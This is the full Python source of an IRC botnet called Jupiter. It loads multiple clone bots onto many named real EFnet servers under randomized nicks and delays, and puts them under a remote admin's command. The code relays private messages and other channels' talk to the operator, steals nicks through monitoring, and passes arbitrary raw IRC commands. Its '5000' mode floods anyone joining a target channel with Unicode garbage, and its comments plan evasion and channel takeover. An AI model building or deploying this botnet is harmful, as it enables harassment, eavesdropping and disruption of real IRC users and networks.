#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Jupiter IRC Botnet - Developed by acidvegas in Python (https://git.acid.vegas/jupiter)

import random
import re
import socket
import ssl
import time
import threading

# Connection
servers = (
	{'server':'efnet.deic.eu',         'ssl':6697},
	{'server':'efnet.port80.se',       'ssl':6697},
	{'server':'efnet.portlane.se',     'ssl':6697},
	{'server':'irc.choopa.net',        'ssl':9000},
	{'server':'irc.colosolutions.net', 'ssl':None}, # No IPv6 or SSL (error: SSL handshake failed: unsafe legacy renegotiation disabled)
	{'server':'irc.du.se',             'ssl':None}, # No IPv6 or SSL (error: handshake failed: dh key too small)
	{'server':'irc.efnet.fr',          'ssl':6697},
	{'server':'irc.efnet.nl',          'ssl':6697},
	{'server':'irc.homelien.no',       'ssl':6697},
	{'server':'irc.mzima.net',         'ssl':6697},
	{'server':'irc.nordunet.se',       'ssl':6697},
	{'server':'irc.prison.net',        'ssl':None}, # No IPv6
	{'server':'irc.underworld.no',     'ssl':6697},
	{'server':'irc.servercentral.net', 'ssl':9999}  # No IPv6
)
ipv6     = False # Set to True to attempt IPv6 connections for more clones
#vhosts  = None  # Use (line.rstrip() for line in open('vhosts.txt','r').readlines() if line) for reading from a file.
channel  = '#jupiter'
key      = None

# Settings
admin           = 'nick!user@host' # Can use wildcards (Must be in nick!user@host format)
concurrency     = 3                # Number of clones to load per server
id              = 'TEST'           # Unique ID so you can tell which bots belong what server

# Formatting Control Characters / Color Codes
bold        = '\x02'
reset       = '\x0f'
green       = '03'
red         = '04'
purple      = '06'
orange      = '07'
yellow      = '08'
light_green = '09'
cyan        = '10'
light_cyan  = '11'
light_blue  = '12'
pink        = '13'
grey        = '14'

# Globals
bots = list()

def botlist(nick):
	global bots
	if nick[:1] == '+':
		bots.append(nick[1:])
	elif nick[:1] == '-':
		bots.remove(nick[1:])

def color(msg, foreground, background=None):
	return f'\x03{foreground},{background}{msg}{reset}' if background else f'\x03{foreground}{msg}{reset}'

def debug(msg):
	print(f'{get_time()} | [~] - {msg}')

def error(msg, reason=None):
	print(f'{get_time()} | [!] - {msg} ({reason})') if reason else print(f'{get_time()} | [!] - {msg}')

def get_time():
	return time.strftime('%I:%M:%S')

def is_admin(ident):
	return re.compile(admin.replace('*','.*')).search(ident)

def random_nick():
	prefix = random.choice(['st','sn','cr','pl','pr','qu','br','gr','sh','sk','kl','wr']+list('bcdfgklmnprstvwz'))
	midfix = random.choice(('aeiou'))+random.choice(('aeiou'))+random.choice(('bcdfgklmnprstvwz'))
	suffix = random.choice(['ed','est','er','le','ly','y','ies','iest','ian','ion','est','ing','led']+list('abcdfgklmnprstvwz'))
	return prefix+midfix+suffix

def unicode():
	msg=''
	for i in range(random.randint(150, 200)):
		msg += chr(random.randint(0x1000,0x3000))
	return msg

class clone(threading.Thread):
	def __init__(self, server, addr_type):
		self.addr_type  = addr_type
		self.landmine   = None
		self.monlist    = list()
		self.nickname   = random_nick()
		self.server     = server
		self.port       = 6667
		self.relay      = None
		self.sock       = None
		self.ssl_status = None
		threading.Thread.__init__(self)

	def run(self):
		time.sleep(random.randint(300,900))
		self.connect()

	def connect(self):
		try:
			self.create_socket()
			self.sock.connect((self.server['server'], self.port))
			self.raw(f'USER {random_nick()} 0 * :{random_nick()}')
			self.nick(self.nickname)
		except socket.error as ex:
			error('Failed to connect to \'{0}\' IRC server.'.format(self.server['server']), ex)
			self.event_disconnect()
		except ssl.SSLError as ex:
			error('Failed to connect to \'{0}\' IRC server using SSL/TLS.'.format(self.server['server']), ex)
			self.ssl_status = False
			self.event_disconnect()
		else:
			self.listen()

	def create_socket(self):
		self.sock = socket.socket(self.addr_type)
		#if self.vhost:
		#	self.sock.bind((self.vhost,0))
		if self.server['ssl']:
			if self.ssl_status:
				self.port = self.server['ssl']
				self.sock = ssl.wrap_socket(self.sock)
			else:
				self.port = 6667
				self.ssl_status = True

	def event_connect(self):
		if self.nickname not in bots:
			botlist('+'+self.nickname)
		if self.monlist:
			self.monitor('+', self.monlist)
		self.join_channel(channel, key)

	def event_ctcp(self, nick, target, msg):
		if target == self.nickname:
			self.sendmsg(channel, '[{0}] {1}{2}{3} {4}'.format(color('CTCP', green), color('<', grey), color(nick, yellow), color('>', grey), msg))
			# Todo: send CTCP replies to avoid suspicion

	def event_disconnect(self):
		if self.nickname in bots:
			botlist('-'+self.nickname)
		self.sock.close()
		time.sleep(86400+random.randint(1800,3600))
		self.connect()

	def event_join(self, nick, chan):
		if chan == self.landmine:
			self.sendmsg(chan, f'{unicode()} oh god {nick} what is happening {unicode()}')
			self.sendmsg(nick, f'{unicode()} oh god {nick} what is happening {unicode()}')

	def event_nick(self, nick, new_nick):
		if nick == self.nickname:
			self.nickname = new_nick
			if new_nick in self.monlist:
				self.monitor('C')
				self.monlist = list()
		elif nick in self.monlist:
			self.nick(nick)

	def event_nick_in_use(self, nick, target_nick):
		if nick == '*':
			self.nickname = random_nick()
			self.nick(self.nickname)

	def event_notice(self, nick, target, msg):
		if target == self.nickname:
			self.sendmsg(channel, '[{0}] {1}{2}{3} {4}'.format(color('NOTICE', purple), color('<', grey), color(nick, yellow), color('>', grey), msg))

	def event_message(self, ident, nick, target, msg):
		if target == self.relay:
			# Todo: throttle relayed messages to avoid flooding out
			self.sendmsg(channel, '[{0}] <{1}>: {2}'.format(color(target, cyan), color(nick[:15].ljust(15), purple), msg))
		if is_admin(ident):
			args = msg.split()
			if args[0] in ('@all',self.nickname) and len(args) >= 2:
				if len(args) == 2:
					if args[1] == 'id':
						self.sendmsg(target, id)
				elif len(args) == 3:
					if args[1] == '5000':
						chan = args[2]
						if chan == 'stop':
							self.landmine = None
							self.sendmsg(channel, '5000 mode turned off')
						elif chan[:1] == '#':
							self.landmine = chan
							self.sendmsg(channel, '5000 mode actived on ' + color(chan, cyan))
					elif args[1] == 'monitor':
						if args[2] == 'list' and self.monlist:
							self.sendmsg(target, '[{0}] {1}'.format(color('Monitor', light_blue), ', '.join(self.monlist)))
						elif args[2] == 'reset' and self.monlist:
							self.monitor('C')
							self.monlist = list()
							self.sendmsg(target, '{0} nick(s) have been {1} from the monitor list.'.format(color(str(len(self.monlist)), cyan), color('removed', red)))
						elif args[2][:1] == '+':
							nicks = [mon_nick for mon_nick in set(args[2][1:].split(',')) if mon_nick not in self.monlist]
							if nicks:
								self.monitor('+', nicks)
								self.monlist += nicks
								self.sendmsg(target, '{0} nick(s) have been {1} to the monitor list.'.format(color(str(len(nicks)), cyan), color('added', green)))
						elif args[2][:1] == '-':
							nicks = [mon_nick for mon_nick in set(args[2][1:].split(',')) if mon_nick in self.monlist]
							if nicks:
								self.monitor('-', nicks)
								for mon_nick in nicks:
									self.monlist.remove(mon_nick)
								self.sendmsg(target, '{0} nick(s) have been {1} from the monitor list.'.format(color(str(len(nicks)), cyan), color('removed', red)))
					elif args[1] == 'relay' and args[0] == self.nickname:
						chan = args[2]
						if chan == 'stop':
							self.relay = None
							self.sendmsg(channel, 'Relay turned off')
						elif chan[:1] == '#':
							self.relay = chan
							self.sendmsg(channel, 'Monitoring ' + color(chan, cyan))
				elif len(args) >= 4 and args[1] == 'raw':
					if args[2] == '-d':
						data = ' '.join(args[3:])
						threading.Thread(target=self.raw, args=(data,True)).start()
					else:
						data = ' '.join(args[2:])
						self.raw(data)

		elif target == self.nickname:
			if msg.startswith('\x01ACTION'):
				self.sendmsg(channel, '[{0}] {1}{2}{3} * {4}'.format(color('PM', red), color('<', grey), color(nick, yellow), color('>', grey), msg[8:][:-1]))
			else:
				self.sendmsg(channel, '[{0}] {1}{2}{3} {4}'.format(color('PM', red), color('<', grey), color(nick, yellow), color('>', grey), msg))

	def event_mode(self, nick, chan, modes):
		# Todo: takeover landmine mode to automatically jupe a channel upon +o
		pass

	def event_quit(self, nick):
		if nick in self.monlist:
			self.nick(nick)

	def handle_events(self, data):
		args = data.split()
		if data.startswith('ERROR :Closing Link:'):
			raise Exception('Connection has closed.')
		elif data.startswith('ERROR :Reconnecting too fast'):
			raise Exception('Connection has closed. (throttled)')
		elif args[0] == 'PING':
			self.raw('PONG ' + args[1][1:])
		elif args[1] == '001': # RPL_WELCOME
			self.event_connect()
		elif args[1] == '433' and len(args) >= 4: # ERR_NICKNAMEINUSE
			nick = args[2]
			target_nick = args[3]
			self.event_nick_in_use(nick, target_nick)
		elif args[1] == '731' and len(args) >= 4: # RPL_MONOFFLINE
			nick = args[3][1:]
			self.nick(nick)
		elif args[1] == 'JOIN' and len(args) == 3:
			nick = args[0].split('!')[0][1:]
			chan = args[2][1:]
			self.event_join(nick, chan)
		elif args[1] == 'MODE' and len(args) >= 4:
			nick  = args[0].split('!')[0][1:]
			chan  = args[2]
			modes = ' '.join(args[:3])
			self.event_mode(nick, chan, modes)
		elif args[1] == 'NICK' and len(args) == 3:
			nick = args[0].split('!')[0][1:]
			new_nick = args[2][1:]
			self.event_nick(nick, new_nick)
		elif args[1] == 'NOTICE':
			nick   = args[0].split('!')[0][1:]
			target = args[2]
			msg    = ' '.join(args[3:])[1:]
			self.event_notice(nick, target, msg)
		elif args[1] == 'PRIVMSG' and len(args) >= 4:
			ident  = args[0][1:]
			nick   = args[0].split('!')[0][1:]
			target = args[2]
			msg    = ' '.join(args[3:])[1:]
			if msg[:1] == '\001':
				msg = msg[1:]
				self.event_ctcp(nick, target, msg)
			else:
				self.event_message(ident, nick, target, msg)
		elif args[1] == 'QUIT':
			nick = args[0].split('!')[0][1:]
			self.event_quit(nick)

	def join_channel(self, chan, key=None):
		self.raw(f'JOIN {chan} {key}') if key else self.raw('JOIN ' + chan)

	def listen(self):
		while True:
			try:
				data = self.sock.recv(1024).decode('utf-8')
				for line in (line for line in data.split('\r\n') if len(line.split()) >= 2):
					#debug(line)
					self.handle_events(line)
			except (UnicodeDecodeError,UnicodeEncodeError):
				pass
			except Exception as ex:
				error('Unexpected error occured on \'{0}\' server.'.format(self.server['server']), ex)
				break
		self.event_disconnect()

	def mode(self, target, mode):
		self.raw(f'MODE {target} {mode}')

	def monitor(self, action, nicks=list()):
		self.raw(f'MONITOR {action} ' + ','.join(nicks))

	def nick(self, nick):
		self.raw('NICK ' + nick)

	def raw(self, data, delay=False):
		if delay:
			time.sleep(random.randint(300,900))
		self.sock.send(bytes(data + '\r\n', 'utf-8'))

	def sendmsg(self, target, msg):
		self.raw(f'PRIVMSG {target} :{msg}')

# Main
for i in range(concurrency):
	for server in servers:
		clone(server, socket.AF_INET).start()
		if ipv6:
			if set([ip[4][0] for ip in socket.getaddrinfo(self.server['server'],6667) if ':' in ip[4][0]]):
				clone(server, socket.AF_INET6).start()
while True:input('')